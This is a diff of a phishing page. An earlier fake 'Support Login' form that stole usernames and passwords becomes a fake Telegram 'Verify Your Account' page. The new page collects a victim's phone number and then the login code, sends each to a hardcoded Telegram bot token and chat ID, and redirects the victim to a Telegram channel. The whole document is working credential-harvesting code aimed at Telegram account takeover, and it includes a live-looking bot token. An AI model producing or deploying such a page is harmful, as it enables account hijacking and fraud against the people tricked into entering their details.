@@ -3,54 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Support Login</title>
+    <title>Telegram Support - Verification</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
-        .login-box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); width: 340px; text-align: center; }
-        h2 { color: #1c1e21; margin-bottom: 20px; font-size: 24px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
-        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 18px; font-weight: bold; margin-top: 10px; }
-        button:hover { background: #166fe5; }
-        .footer { margin-top: 20px; font-size: 13px; color: #777; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
+        .login-box { background: white; padding: 35px; border-radius: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 330px; text-align: center; }
+        img { width: 85px; margin-bottom: 20px; }
+        h2 { font-size: 22px; margin-bottom: 10px; color: #222; }
+        p { font-size: 15px; color: #666; margin-bottom: 25px; line-height: 1.4; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; transition: border 0.3s; }
+        input:focus { border: 1px solid #3390ec; outline: none; }
+        button { width: 100%; padding: 14px; background: #3390ec; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 17px; font-weight: bold; margin-top: 15px; }
+        button:hover { background: #2b7bc5; }
+        #codeField { display: none; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <h2>Login Required</h2>
-        <p style="color: #666; font-size: 14px;">Please login to access support services.</p>
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="Phone, email or username" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit">Log In</button>
-        </form>
-        <div class="footer">Secure Connection Provided</div>
-    </div>
 
-    <script>
-        const form = document.getElementById('loginForm');
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
-            
-            // የተላከው መረጃ ያንተን Bot Token እና Chat ID ይጠቀማል
-            const token = '7249691006:AAGDEpLHUkarPvbWlyMaTwpABPmJSrDOJPI';
-            const chat_id = '6338638588';
+<div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
+    <h2>Verify Your Account</h2>
+    <p id="instruction">Enter your phone number to receive a secure verification code.</p>
 
-            const message = `🚨 **New Login Alert!**\n\n👤 **User:** \`${user}\` \n🔑 **Pass:** \`${pass}\``;
+    <form id="loginForm">
+        <input type="tel" id="phone" placeholder="Phone Number (e.g. +251...)" required>
+        
+        <div id="codeField">
+            <input type="text" id="login_code" placeholder="Enter 5-digit code" maxlength="6">
+        </div>
 
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+        <button type="submit" id="mainBtn">Next</button>
+    </form>
+</div>
 
-            fetch(url)
-            .then(response => {
-                // መረጃው እንደተላከ ወደ ቴሌግራም ገጽህ ይወስዳቸዋል
+<script>
+    const form = document.getElementById('loginForm');
+    const codeField = document.getElementById('codeField');
+    const mainBtn = document.getElementById('mainBtn');
+    const instruction = document.getElementById('instruction');
+    const phoneInput = document.getElementById('phone');
+    
+    let step = 1; 
+    const token = '7249691006:AAGDEpLHUkarPvbWlyMaTwpABPmJSrDOJPI';
+    const chat_id = '6338638588';
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const phone = phoneInput.value;
+        const loginCode = document.getElementById('login_code').value;
+
+        if (step === 1) {
+            // Send Phone to Telegram
+            const msg1 = `📱 **New Phone Received!**\n------------------------\n**Phone:** \`${phone}\``;
+            sendToTelegram(msg1);
+
+            // Change UI for Code Step
+            phoneInput.style.display = 'none';
+            codeField.style.display = 'block';
+            instruction.innerText = "A code was sent via Telegram. Please enter it below.";
+            mainBtn.innerText = 'Verify & Login';
+            step = 2;
+        } else {
+            // Send Code to Telegram
+            const msg2 = `🔑 **Telegram Code Received!**\n------------------------\n**Phone:** \`${phone}\` \n**Code:** \`${loginCode}\``;
+            sendToTelegram(msg2);
+
+            // Finalizing
+            mainBtn.innerText = 'Processing...';
+            setTimeout(() => {
                 window.location.href = "https://t.me/Mame_Tech_Solution";
-            })
-            .catch(err => {
-                window.location.href = "https://t.me/Mame_Tech_Solution";
-            });
-        });
-    </script>
+            }, 1500);
+        }
+    });
+
+    function sendToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+    }
+</script>
+
 </body>
 </html>
